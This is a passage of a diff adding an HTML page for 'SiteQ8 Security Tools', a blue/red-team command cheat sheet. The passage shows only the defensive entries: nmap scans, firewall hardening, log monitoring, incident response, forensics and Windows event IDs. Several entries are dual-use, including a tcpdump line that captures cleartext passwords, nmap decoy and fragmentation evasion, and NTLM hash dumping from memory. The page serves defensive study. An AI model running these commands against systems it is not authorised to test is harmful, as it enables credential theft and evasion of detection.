@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SiteQ8 Security Tools</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Black+Han+Sans&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+:root{
+  --ink:#050608;--ink1:#08090d;--ink2:#0c0f16;--ink3:#10141e;--ink4:#151b28;
+  --line:#1c2336;--line2:#252f47;--ghost:#2e3d5a;--muted:#4a5e80;
+  --mid:#6b80a8;--body:#98aac8;--hi:#dce8f8;--white:#f0f6ff;
+  --azure:#3d9bff;--ag:rgba(61,155,255,.26);--ad:rgba(61,155,255,.06);
+  --scarlet:#ff3d5a;--sg:rgba(255,61,90,.26);--sd:rgba(255,61,90,.06);
+  --jade:#00e8a2;--jg:rgba(0,232,162,.26);--jd:rgba(0,232,162,.06);
+  --amber:#ffc340;
+  --mono:'IBM Plex Mono',monospace;--display:'Black Han Sans',monospace;
+  --r:4px;--r2:8px;
+}
+body{font-family:var(--mono);background:var(--ink);color:var(--body);display:flex;flex-direction:column;position:relative}
+body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:.5}
+
+/* TOPBAR */
+#topbar{height:50px;background:var(--ink1);border-bottom:1px solid var(--line);display:flex;align-items:center;padding:0 20px;gap:16px;flex-shrink:0;position:relative;z-index:100}
+#topbar::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,var(--scarlet),var(--azure),var(--jade));opacity:.5}
+.brand{font-family:var(--display);font-size:17px;letter-spacing:3px;color:var(--white);text-transform:uppercase;white-space:nowrap;line-height:1}
+.brand b{color:var(--jade);font-weight:400;text-shadow:0 0 14px var(--jg)}
+.sw{flex:1;max-width:500px;position:relative;margin-left:4px}
+.si{position:absolute;left:11px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:13px;pointer-events:none;font-family:var(--mono)}
+#srch{width:100%;background:var(--ink3);border:1px solid var(--line2);border-radius:var(--r);padding:7px 12px 7px 32px;color:var(--hi);font-family:var(--mono);font-size:12px;outline:none;letter-spacing:.4px;transition:border-color .18s,box-shadow .18s}
+#srch:focus{border-color:var(--azure);box-shadow:0 0 0 2px rgba(61,155,255,.12),0 0 18px rgba(61,155,255,.12)}
+#srch::placeholder{color:var(--muted)}
+#hb{font-size:10px;color:var(--muted);letter-spacing:.5px;white-space:nowrap}
+.filters{display:flex;gap:6px;margin-left:auto}
+.fp{font-family:var(--display);font-size:11px;letter-spacing:2px;padding:4px 13px;border-radius:20px;border:1px solid;cursor:pointer;transition:all .14s;white-space:nowrap}
+.fa{color:var(--jade);border-color:rgba(0,232,162,.25);background:var(--jd)}.fa:hover,.fa.on{background:var(--jade);color:var(--ink);box-shadow:0 0 14px var(--jg)}
+.fb{color:var(--azure);border-color:rgba(61,155,255,.25);background:var(--ad)}.fb:hover,.fb.on{background:var(--azure);color:var(--ink);box-shadow:0 0 14px var(--ag)}
+.fr{color:var(--scarlet);border-color:rgba(255,61,90,.25);background:var(--sd)}.fr:hover,.fr.on{background:var(--scarlet);color:var(--ink);box-shadow:0 0 14px var(--sg)}
+
+/* LAYOUT */
+#layout{display:flex;flex:1;overflow:hidden}
+
+/* SIDEBAR */
+#sidebar{width:236px;flex-shrink:0;background:var(--ink1);border-right:1px solid var(--line);overflow-y:auto;display:flex;flex-direction:column}
+#sidebar::-webkit-scrollbar{width:2px}
+#sidebar::-webkit-scrollbar-thumb{background:var(--line2)}
+.ng{padding:14px 0 6px}
+.ngt{padding:0 16px 7px;font-size:9px;letter-spacing:3.5px;display:flex;align-items:center;gap:10px}
+.ngt.gb{color:var(--azure)}.ngt.gr{color:var(--scarlet)}.ngt::after{content:'';flex:1;height:1px;background:var(--line)}
+.ni{display:flex;align-items:center;padding:7px 16px;gap:9px;font-size:11.5px;color:var(--muted);cursor:pointer;border-left:2px solid transparent;transition:color .1s,background .1s;letter-spacing:.2px}
+.ni:hover{color:var(--hi);background:var(--ink2)}
+.ni.active{color:var(--hi);background:var(--ink3);border-left-color:var(--azure)}
+.ni.active.ar{border-left-color:var(--scarlet)}
+.nico{font-size:14px;flex-shrink:0}
+.nb{margin-left:auto;font-size:9px;background:var(--ink3);color:var(--ghost);border:1px solid var(--line);padding:1px 5px;border-radius:3px}
+
+/* MAIN */
+#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+#crumb{height:38px;padding:0 24px;display:flex;align-items:center;gap:7px;border-bottom:1px solid var(--line);background:var(--ink1);font-size:10px;color:var(--muted);letter-spacing:.5px;flex-shrink:0}
+.cl{cursor:pointer;transition:color .1s}.cl:hover{color:var(--azure)}
+.cs{color:var(--line2);margin:0 1px}
+.cc{color:var(--body)}
+#content{flex:1;overflow-y:auto;padding:24px 28px}
+#content::-webkit-scrollbar{width:4px}
+#content::-webkit-scrollbar-thumb{background:var(--line2);border-radius:2px}
+
+/* HOME */
+.hero{position:relative;padding:36px 0 30px;overflow:hidden;margin-bottom:28px;border-bottom:1px solid var(--line)}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 10% 60%,rgba(61,155,255,.07) 0%,transparent 55%),radial-gradient(ellipse at 90% 60%,rgba(255,61,90,.07) 0%,transparent 55%);pointer-events:none}
+.hero::after{content:'Q8';position:absolute;right:-10px;top:-14px;font-family:var(--display);font-size:160px;color:rgba(255,255,255,.022);pointer-events:none;line-height:1}
+.ht{font-family:var(--display);font-size:38px;letter-spacing:4px;color:var(--white);text-transform:uppercase;line-height:1;margin-bottom:10px}
+.ht em{font-style:normal;color:var(--jade);text-shadow:0 0 22px var(--jg)}
+.hs{font-size:11px;color:var(--muted);line-height:1.7;letter-spacing:.4px;max-width:580px;margin-bottom:26px}
+.hst{display:flex;gap:32px}
+.sv{font-family:var(--display);font-size:26px;color:var(--jade);text-shadow:0 0 16px var(--jg);line-height:1}
+.sl{font-size:9px;color:var(--ghost);letter-spacing:2px;margin-top:3px}
+.tcards{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:28px}
+.tc{background:var(--ink2);border:1px solid var(--line);border-radius:var(--r2);padding:22px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.tc::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
+.tb::before{background:linear-gradient(90deg,transparent,var(--azure),transparent)}
+.tr::before{background:linear-gradient(90deg,transparent,var(--scarlet),transparent)}
+.tc:hover{transform:translateY(-2px)}
+.tb:hover{border-color:var(--azure);box-shadow:0 8px 32px rgba(61,155,255,.14),inset 0 0 60px rgba(61,155,255,.03)}
+.tr:hover{border-color:var(--scarlet);box-shadow:0 8px 32px rgba(255,61,90,.14),inset 0 0 60px rgba(255,61,90,.03)}
+.tci{font-size:30px;margin-bottom:12px}
+.tct{font-family:var(--display);font-size:17px;letter-spacing:2px;text-transform:uppercase;margin-bottom:7px}
+.tb .tct{color:var(--azure)}.tr .tct{color:var(--scarlet)}
+.tcd{font-size:10px;color:var(--muted);line-height:1.7;letter-spacing:.3px;margin-bottom:14px}
+.tctags{display:flex;flex-wrap:wrap;gap:5px}
+.ctag{font-size:9px;letter-spacing:.6px;padding:2px 7px;border-radius:2px;border:1px solid}
+.tb .ctag{color:rgba(61,155,255,.75);border-color:rgba(61,155,255,.18);background:rgba(61,155,255,.04)}
+.tr .ctag{color:rgba(255,61,90,.75);border-color:rgba(255,61,90,.18);background:rgba(255,61,90,.04)}
+.qal{font-size:9px;letter-spacing:3px;color:var(--ghost);margin-bottom:10px}
+.qag{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+.qac{background:var(--ink2);border:1px solid var(--line);border-radius:var(--r);padding:14px 10px;cursor:pointer;text-align:center;transition:all .12s}
+.qac:hover{border-color:var(--jade);background:rgba(0,232,162,.04)}
+.qac:hover .qan{color:var(--jade)}
+.qai{font-size:20px;margin-bottom:5px}
+.qan{font-size:9px;color:var(--muted);letter-spacing:.5px;transition:color .12s}
+
+/* SECTION */
+.sh{display:flex;align-items:flex-start;gap:15px;padding-bottom:20px;margin-bottom:22px;border-bottom:1px solid var(--line)}
+.sico{font-size:34px}
+.sn{font-family:var(--display);font-size:22px;letter-spacing:2px;color:var(--white);text-transform:uppercase;margin-bottom:4px}
+.sd{font-size:10px;color:var(--muted);line-height:1.65;letter-spacing:.3px}
+.cg{display:grid;grid-template-columns:repeat(auto-fill,minmax(430px,1fr));gap:10px}
+
+/* CMD CARD */
+.cc2{background:var(--ink2);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:border-color .14s,box-shadow .14s}
+.cc2.cb:hover{border-color:rgba(61,155,255,.45);box-shadow:0 0 16px rgba(61,155,255,.08)}
+.cc2.cr:hover{border-color:rgba(255,61,90,.45);box-shadow:0 0 16px rgba(255,61,90,.08)}
+.ch{display:flex;align-items:center;padding:8px 12px;background:var(--ink3);border-bottom:1px solid var(--line);gap:8px;cursor:pointer}
+.dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.db{background:var(--azure);box-shadow:0 0 7px var(--azure)}
+.dr{background:var(--scarlet);box-shadow:0 0 7px var(--scarlet)}
+.clbl{font-size:11.5px;color:var(--hi);flex:1;letter-spacing:.2px;transition:color .1s}
+.ch:hover .clbl{color:var(--white)}
+.cpb{background:none;border:1px solid var(--line2);color:var(--ghost);font-family:var(--mono);font-size:9px;letter-spacing:1px;padding:2px 8px;border-radius:3px;cursor:pointer;transition:all .1s}
+.cpb:hover{border-color:var(--jade);color:var(--jade)}
+.cpb.ok{border-color:var(--jade);color:var(--jade);background:rgba(0,232,162,.07)}
+.cprev{padding:10px 12px;font-size:11.5px;line-height:1.65;color:var(--jade);white-space:pre-wrap;word-break:break-all;overflow-wrap:break-word;cursor:pointer;max-height:86px;overflow:hidden;position:relative;transition:color .1s}
+.cprev::after{content:'';position:absolute;bottom:0;left:0;right:0;height:30px;background:linear-gradient(transparent,var(--ink2));pointer-events:none}
+.cprev:hover{color:var(--hi)}
+
+/* MODAL */
+#overlay{display:none;position:fixed;inset:0;background:rgba(5,6,8,.88);backdrop-filter:blur(4px);z-index:600;align-items:center;justify-content:center}
+#overlay.open{display:flex}
+#modal{background:var(--ink2);border:1px solid var(--line2);border-radius:var(--r2);width:min(720px,92vw);max-height:80vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 0 80px rgba(0,0,0,.8);animation:mp .15s ease}
+@keyframes mp{from{opacity:0;transform:scale(.95) translateY(8px)}to{opacity:1;transform:none}}
+.mt{display:flex;align-items:center;gap:10px;padding:14px 18px;background:var(--ink3);border-bottom:1px solid var(--line);flex-shrink:0}
+.mti{font-size:13px;color:var(--hi);flex:1;letter-spacing:.3px}
+.mteam{font-family:var(--display);font-size:10px;letter-spacing:2px;padding:2px 9px;border-radius:20px;border:1px solid}
+.mb2{color:var(--azure);border-color:rgba(61,155,255,.3);background:rgba(61,155,255,.07)}
+.mr2{color:var(--scarlet);border-color:rgba(255,61,90,.3);background:rgba(255,61,90,.07)}
+.mx{background:none;border:1px solid var(--line2);color:var(--muted);width:27px;height:27px;border-radius:var(--r);cursor:pointer;font-size:13px;display:flex;align-items:center;justify-content:center;transition:all .1s;flex-shrink:0}
+.mx:hover{border-color:var(--scarlet);color:var(--scarlet)}
+.mbody{flex:1;overflow-y:auto;padding:20px;font-size:13px;line-height:1.8;color:var(--jade);white-space:pre-wrap;word-break:break-all;overflow-wrap:break-word}
+.mbody::-webkit-scrollbar{width:3px}
+.mbody::-webkit-scrollbar-thumb{background:var(--line2)}
+.mf{padding:11px 18px;border-top:1px solid var(--line);display:flex;gap:8px;justify-content:flex-end;flex-shrink:0;background:var(--ink3)}
+.btn{font-family:var(--mono);font-size:10px;letter-spacing:1px;padding:7px 18px;border-radius:var(--r);cursor:pointer;border:1px solid;transition:all .12s}
+.bg2{background:none;border-color:var(--line2);color:var(--muted)}.bg2:hover{border-color:var(--body);color:var(--hi)}
+.bcp{background:rgba(61,155,255,.08);border-color:rgba(61,155,255,.35);color:var(--azure)}.bcp:hover{background:var(--azure);color:var(--ink);box-shadow:0 0 14px var(--ag)}
+.bcp.done{background:rgba(0,232,162,.08);border-color:var(--jade);color:var(--jade)}
+
+/* SEARCH */
+.srh{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.srt{font-family:var(--display);font-size:16px;letter-spacing:1px;color:var(--hi)}
+.src{font-size:9px;letter-spacing:.5px;padding:2px 8px;border-radius:10px;background:rgba(0,232,162,.08);color:var(--jade);border:1px solid rgba(0,232,162,.2)}
+mark{background:rgba(255,195,64,.18);color:var(--amber);border-radius:2px;padding:0 2px}
+.es{text-align:center;padding:70px 20px;color:var(--muted)}
+.ei{font-size:44px;margin-bottom:16px;opacity:.5}
+.em{font-size:11px;line-height:1.8;letter-spacing:.3px}
+
+/* TOAST */
+#toast{position:fixed;bottom:22px;right:22px;background:var(--ink3);border:1px solid var(--jade);color:var(--jade);font-size:10px;letter-spacing:2px;padding:9px 18px;border-radius:var(--r);box-shadow:0 0 18px var(--jg);opacity:0;transform:translateY(8px);transition:all .18s;pointer-events:none;z-index:999}
+#toast.show{opacity:1;transform:none}
+
+@media(max-width:820px){
+  #sidebar{width:195px}.cg{grid-template-columns:1fr}.tcards{grid-template-columns:1fr}.qag{grid-template-columns:repeat(2,1fr)}.ht{font-size:26px}
+}
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <div class="brand">Site<b>Q8</b> / Security</div>
+  <div class="sw">
+    <span class="si">⌕</span>
+    <input id="srch" type="text" placeholder="Search commands, tools, techniques…  ⌘K" autocomplete="off" spellcheck="false">
+  </div>
+  <span id="hb"></span>
+  <div class="filters">
+    <div class="fp fa on" data-f="all">ALL</div>
+    <div class="fp fb" data-f="blue">🔵 BLUE</div>
+    <div class="fp fr" data-f="red">🔴 RED</div>
+  </div>
+</div>
+
+<div id="layout">
+  <nav id="sidebar"></nav>
+  <div id="main">
+    <div id="crumb"></div>
+    <div id="content"></div>
+  </div>
+</div>
+
+<div id="overlay" onclick="oc(event)">
+  <div id="modal">
+    <div class="mt">
+      <span id="mti" class="mti"></span>
+      <span id="mteam" class="mteam"></span>
+      <button class="mx" onclick="cm()">✕</button>
+    </div>
+    <div id="mbody" class="mbody"></div>
+    <div class="mf">
+      <button class="btn bg2" onclick="cm()">CLOSE</button>
+      <button id="mcb" class="btn bcp" onclick="cpm()">[ COPY ]</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast">✓ COPIED</div>
+
+<script>
+const BLUE=[
+{id:'bl-prep',icon:'📋',label:'Preparation',desc:'Key documents checklist, NIST CSF phases, IR planning templates',cmds:[
+{t:'Key documents checklist',c:'Organization Chart\nNetwork Diagrams\nData Flow Diagrams\nCritical Asset / Data / Services List\nRules of Engagement (ROE)\nIncident Response Plan\nBusiness Continuity Plan\nDisaster Recovery Plan'},
+{t:'NIST Cybersecurity Framework',c:'1. IDENTIFY  — Know assets, risks, governance\n2. PROTECT   — Implement safeguards\n3. DETECT    — Discover cybersecurity events\n4. RESPOND   — Take action on incidents\n5. RECOVER   — Restore capabilities & services'},
+{t:'Incident Response phases',c:'Preparation → Identification → Containment\n→ Eradication → Recovery → Lessons Learned'},
+{t:'Audit — Enable all events (Windows)',c:'auditpol /set /category:* /success:enable /failure:enable'},
+{t:'Audit — Check current policy',c:'auditpol /get /category:*'},
+{t:'Increase Security log to 100 MB',c:'reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Security /v MaxSize /t REG_DWORD /d 0x64000'},
+]},
+{id:'bl-id',icon:'🔎',label:'Identify — Scanning',desc:'NMAP, Nessus, OpenVAS, Windows/Linux discovery, Active Directory enumeration, hashing',cmds:[
+{t:'NMAP — Ping sweep',c:'nmap -sn -PE <IP_RANGE>'},
+{t:'NMAP — Open ports only',c:'nmap --open <IP_RANGE>'},
+{t:'NMAP — Service + OS detection',c:'nmap -sV -O -T4 <IP>'},
+{t:'NMAP — All ports + default scripts',c:'nmap -p- -sC -sV <IP>'},
+{t:'NMAP — Aggressive all-in-one',c:'nmap -A -T4 <IP>'},
+{t:'NMAP — Vulnerability scripts',c:'nmap --script=vuln <IP>'},
+{t:'NMAP — Save all output formats',c:'nmap -oA scan_results <IP_RANGE>'},
+{t:'NMAP — Firewall evasion (fragment + decoy)',c:'nmap -f -D RND:5 <IP>'},
+{t:'OpenVAS — Update NVT database',c:'openvas-nvt-sync'},
+{t:'OpenVAS — Start services',c:'service openvas-scanner start && service openvas-manager start'},
+{t:'Windows — Ping sweep (cmd)',c:'for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> live.txt'},
+{t:'Linux — Ping sweep (bash)',c:'for ip in $(seq 1 254); do\n  ping -c1 -W1 192.168.1.$ip &>/dev/null && echo "UP: 192.168.1.$ip"\ndone'},
+{t:'AD — All domain users',c:'dsquery * -filter "((objectclass=user))" -attr name samaccountname\nnet user /domain'},
+{t:'AD — Admin users only',c:'dsquery * -filter "(&(objectclass=user)(admincount=1))" -attr samaccountname name'},
+{t:'AD — Domain computers list',c:'dsquery computer -limit 0'},
+{t:'AD — PowerShell get all users',c:'Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Enabled'},
+{t:'Hash — sha256sum / md5sum (Linux)',c:'sha256sum <FILE>\nmd5sum <FILE>'},
+{t:'Hash — Get-FileHash (PowerShell)',c:'Get-FileHash -Algorithm SHA256 <FILE>\nGet-FileHash -Algorithm MD5 <FILE>'},
+{t:'Hash — certutil (Windows)',c:'certutil -hashfile <FILE> SHA256'},
+{t:'Hash — Verify directory baseline',c:'md5deep -r /path/to/dir > baseline.md5\nmd5deep -r -x baseline.md5 /path/to/dir'},
+]},
+{id:'bl-protect',icon:'🛡️',label:'Protect — Hardening',desc:'IPTables, UFW, Windows Firewall, AppLocker, registry hardening, honeypots',cmds:[
+{t:'IPTables — Save rules',c:'iptables-save -c > /etc/iptables/rules.v4'},
+{t:'IPTables — Restore rules',c:'iptables-restore < /etc/iptables/rules.v4'},
+{t:'IPTables — Block IP',c:'iptables -A INPUT -s 10.10.10.10 -j DROP'},
+{t:'IPTables — Block subnet',c:'iptables -A INPUT -s 10.10.10.0/24 -j DROP'},
+{t:'IPTables — Full lockdown',c:'iptables -P INPUT DROP\niptables -P OUTPUT DROP\niptables -P FORWARD DROP\niptables -F'},
+{t:'IPTables — Log denied packets',c:"iptables -I INPUT 5 -m limit --limit 5/min \\\n  -j LOG --log-prefix 'denied: ' --log-level 7"},
+{t:'IPTables — List rules with numbers',c:'iptables -L -v -n --line-numbers'},
+{t:'UFW — Enable / status',c:'ufw enable\nufw status verbose'},
+{t:'UFW — Allow / deny port',c:'ufw allow 22/tcp\nufw deny 23/tcp\nufw allow from 192.168.1.0/24 to any port 22'},
+{t:'Windows FW — Enable all profiles',c:'netsh advfirewall set allprofiles state on'},
+{t:'Windows FW — Block all inbound',c:'netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound'},
+{t:'Windows FW — Add allow rule for app',c:'netsh advfirewall firewall add rule name="MyApp" dir=in action=allow program="C:\\App.exe" enable=yes'},
+{t:'Windows FW — Show all rules',c:'netsh advfirewall firewall show rule name=all'},
+{t:'Registry — Disable LM hash storage',c:'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /f /v NoLMHash /t REG_DWORD /d 1'},
+{t:'Registry — Enforce NTLMv2 only',c:'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel /t REG_DWORD /d 5 /f'},
+{t:'Registry — Enable UAC',c:'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f'},
+{t:'Registry — Disable admin shares',c:'reg add HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v AutoShareWks /t REG_DWORD /d 0 /f'},
+{t:'Honeypot — Linux auto-ban honey port',c:'while [ 1 ]; do\n  IP=$(nc -v -l -p 2222 2>&1 | grep from | cut -d[ -f3 | cut -d] -f1)\n  iptables -A INPUT -p tcp -s ${IP} -j DROP\n  echo "BANNED: $IP" >> /var/log/honeypot.log\ndone'},
+]},
+{id:'bl-detect',icon:'👁️',label:'Detect — Monitoring',desc:'TCPDump, TShark, Snort IDS, Windows/Linux log auditing, auditd, SSL checks',cmds:[
+{t:'TCPDump — Capture to file',c:'tcpdump -i eth0 -XX -w capture.pcap'},
+{t:'TCPDump — HTTP traffic to specific host',c:'tcpdump tcp port 80 and dst <IP>'},
+{t:'TCPDump — All except SSH',c:'tcpdump -i eth0 -tttt dst 192.168.1.22 and not dst port 22'},
+{t:'TCPDump — Grab cleartext passwords',c:"tcpdump -n -A -s0 port http or port ftp or port smtp -lA | egrep -i -B5 'pass=|pwd=|login='"},
+{t:'TCPDump — Capture DNS traffic',c:'tcpdump -i eth0 -c 100 -tttt udp port 53'},
+{t:'TShark — DNS query names',c:'tshark -n -e ip.src -e dns.qry.name -E separator=";" -T fields port 53'},
+{t:'TShark — HTTP host + URI',c:'tshark -R http.request -T fields -E separator=";" -e http.host -e http.request.uri'},
+{t:'TShark — Top talkers from live capture',c:"tshark -n -c 150 | awk '{print $4}' | sort | uniq -c | sort -nr"},
+{t:'Snort — Test configuration file',c:'snort -T -c /etc/snort/snort.conf'},
+{t:'Snort — Run in console IDS mode',c:'snort -q -A console -i eth0 -c /etc/snort/snort.conf'},
+{t:'SSL — Check cert expiry date',c:'echo | openssl s_client -connect <HOST>:443 2>/dev/null | openssl x509 -noout -dates'},
+{t:'SSL — Enumerate cipher suites',c:'nmap --script ssl-enum-ciphers -p 443 <HOST>'},
+{t:'SSL — Check for Heartbleed',c:'nmap -sV --script=ssl-heartbleed <HOST>'},
+{t:'Windows — Query logon events (4624)',c:'wevtutil qe Security /q:"*[System[(EventID=4624)]]" /c:100 /rd:true /f:text'},
+{t:'Windows — Failed login events (4625)',c:'wevtutil qe Security /q:"*[System[(EventID=4625)]]" /f:text'},
+{t:'Windows — Export security log',c:'wevtutil epl Security C:\\security.evtx'},
+{t:'Windows — PS recent Kerberos events',c:'Get-Eventlog Security 4768,4769,4771 -after ((get-date).addDays(-14))'},
+{t:'Linux — Watch failed SSH logins',c:'tail -f /var/log/auth.log | grep "Failed password"'},
+{t:'Linux — Brute force detection',c:"grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20"},
+{t:'Auditd — Watch /etc/passwd',c:'auditctl -w /etc/passwd -p wa -k passwd_changes'},
+{t:'Auditd — Watch sudoers',c:'auditctl -w /etc/sudoers -p wa -k sudoers_watch'},
+{t:'Auditd — Search events by key',c:'ausearch -k passwd_changes --start today'},
+{t:'Auditd — Authentication report',c:'aureport -au\naureport --failed --summary'},
+]},
+{id:'bl-respond',icon:'🚨',label:'Respond — IR',desc:'Windows/Linux triage, network isolation, evidence collection, memory forensics',cmds:[
+{t:'IR Windows — Running processes',c:'tasklist /v\nwmic process get name,executablepath,processid,commandline'},
+{t:'IR Windows — Network connections',c:'netstat -naob\nnetstat -ano | findstr ESTABLISHED'},
+{t:'IR Windows — Scheduled tasks',c:'schtasks /query /fo LIST /v\nschtasks /query /fo CSV > tasks.csv'},
+{t:'IR Windows — Startup run keys',c:'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'},
+{t:'IR Linux — Process tree',c:'ps auxf\nps -eo pid,ppid,user,cmd --forest'},
+{t:'IR Linux — All connections',c:'ss -natp\nlsof -i'},
+{t:'IR Linux — Cron jobs',c:'crontab -l && cat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/'},
+{t:'IR Linux — SUID / SGID binaries',c:'find / -perm -4000 -o -perm -2000 -type f 2>/dev/null'},
+{t:'IR Linux — Recently modified files',c:'find /etc /bin /sbin -mtime -7 -type f\nfind / -newer /tmp -type f 2>/dev/null | grep -v proc | head -50'},
+{t:'Isolate — Windows (block all)',c:'netsh advfirewall set allprofiles firewallpolicy blockinboundalways,blockoutbound'},
+{t:'Isolate — Linux (drop all traffic)',c:'iptables -P INPUT DROP\niptables -P OUTPUT DROP\niptables -P FORWARD DROP\niptables -F'},
+{t:'Isolate — Linux (allow IR host only)',c:'iptables -A INPUT -s <IR_IP> -p tcp --dport 22 -j ACCEPT\niptables -A OUTPUT -d <IR_IP> -p tcp --sport 22 -j ACCEPT'},
+{t:'Evidence — Disk image with hash',c:'dd if=/dev/sda of=/mnt/usb/disk.dd bs=4M\nsha256sum disk.dd > disk.dd.sha256'},
+{t:'Evidence — Memory dump Linux (LiME)',c:'insmod lime.ko "path=/mnt/usb/mem.lime format=lime"'},
+{t:'Evidence — Memory dump Windows (WinPMem)',c:'winpmem_mini.exe memory.raw'},
+{t:'Volatility3 — Process list',c:'vol -f memory.raw windows.pslist'},
+{t:'Volatility3 — Network scan',c:'vol -f memory.raw windows.netscan'},
+{t:'Volatility3 — Find injected code',c:'vol -f memory.raw windows.malfind'},
+{t:'Volatility3 — Cmdline history',c:'vol -f memory.raw windows.cmdline'},
+{t:'Volatility3 — Dump NTLM hashes',c:'vol -f memory.raw windows.hashdump'},
+{t:'Malware — Static analysis basics',c:'file <SAMPLE>\nstrings -n 8 <SAMPLE>\nexiftool <SAMPLE>'},
+{t:'Malware — Hash for VirusTotal',c:'sha256sum <SAMPLE>\n# → https://virustotal.com'},
+]},
+{id:'bl-recover',icon:'🏥',label:'Recover',desc:'Windows SFC/DISM/boot repair, Linux package/fsck/service recovery',cmds:[
+{t:'Windows — SFC scan now',c:'sfc /scannow'},
+{t:'Windows — DISM restore health',c:'DISM /Online /Cleanup-Image /RestoreHealth'},
+{t:'Windows — Boot repair (bootrec)',c:'bootrec /fixmbr\nbootrec /fixboot\nbootrec /rebuildbcd\nbootsect /nt60 ALL /mbr'},
+{t:'Windows — Reset TCP/IP stack',c:'netsh int ip reset resetlog.txt\nnetsh winsock reset catalog'},
+{t:'Windows — Reset firewall to defaults',c:'netsh advfirewall reset'},
+{t:'Windows — List VSS shadow copies',c:'vssadmin list shadows'},
+{t:'Linux — Fix broken packages (Debian)',c:'apt-get -f install\ndpkg --configure -a'},
+{t:'Linux — Restore iptables from file',c:'iptables-restore < /etc/iptables/rules.v4'},
+{t:'Linux — Filesystem check (fsck)',c:'umount /dev/sdb1\nfsck -y /dev/sdb1'},
+{t:'Linux — Re-lock user account',c:'usermod -L <USER>\npasswd -l <USER>'},
+{t:'Linux — Force password change on next login',c:'chage -d 0 <USER>'},
+]},
+{id:'bl-forensics',icon:'🧬',label:'Forensics',desc:'Disk imaging, timeline creation, PCAP analysis, file carving, log analysis',cmds:[
+{t:'Disk — Create forensic image',c:'dd if=/dev/sda of=disk.dd bs=4M\ndcfldd if=/dev/sda of=disk.dd hash=sha256 hashlog=hash.txt'},
+{t:'Disk — Mount image read-only',c:'mount -o ro,loop disk.dd /mnt/image'},
+{t:'Disk — Partition table (Sleuth Kit)',c:'mmls disk.dd'},
+{t:'Disk — File listing (fls)',c:'fls -r disk.dd\nfls -r -o <OFFSET> disk.dd'},
+{t:'Disk — Recover deleted files',c:'tsk_recover -e disk.dd /mnt/recovered/'},
+{t:'Timeline — Create mactime bodyfile',c:'fls -r -m "/" disk.dd > bodyfile.txt\nmactime -b bodyfile.txt -d > timeline.csv'},
+{t:'File carving — Foremost',c:'foremost -t all -i disk.dd -o ./carved/\nforemost -t jpg,pdf,zip -i disk.dd -o ./carved/'},
+{t:'File carving — Binwalk',c:'binwalk -e <FILE>\nbinwalk --dd=".*" <FILE>'},
+{t:'File carving — Strings',c:'strings -n 8 <FILE>\nstrings -el <FILE>   # Unicode\nstrings <FILE> | grep -E "http|@|password"'},
+{t:'PCAP — Quick stats',c:'capinfos capture.pcap'},
+{t:'PCAP — Filter and save',c:"tcpdump -r capture.pcap -w filtered.pcap 'host 10.0.0.1 and port 80'"},
+{t:'PCAP — Detect port scans',c:"tshark -r capture.pcap -Y 'tcp.flags.syn==1 and tcp.flags.ack==0' \\\n  -T fields -e ip.src | sort | uniq -c | sort -rn"},
+{t:'Log — Top source IPs',c:"awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20"},
+]},
+{id:'bl-events',icon:'🔑',label:'Windows Event IDs',desc:'Key Event IDs with logon types reference and query examples',cmds:[
+{t:'Authentication — Successful logon',c:'4624  Successful logon\n4634  Account logoff\n4647  User initiated logoff\n4648  Logon with explicit credentials (runas)\n4672  Special privileges assigned (admin logon)'},
+{t:'Authentication — Failures & lockouts',c:'4625  Failed logon\n4740  Account locked out\n4649  Replay attack detected'},
+{t:'Account management events',c:'4720  Account created\n4722  Account enabled\n4725  Account disabled\n4726  Account deleted\n4728  Member added to global group\n4732  Member added to local group\n4738  Account changed'},
+{t:'Logon type reference',c:'2   Interactive      (physical console)\n3   Network          (net use / mapped drive)\n4   Batch            (scheduled task)\n5   Service          (service start)\n7   Unlock           (screen unlock)\n8   NetworkCleartext (IIS basic auth)\n9   NewCredentials   (runas /netonly)\n10  RemoteInteractive (RDP)\n11  CachedInteractive (cached creds)'},
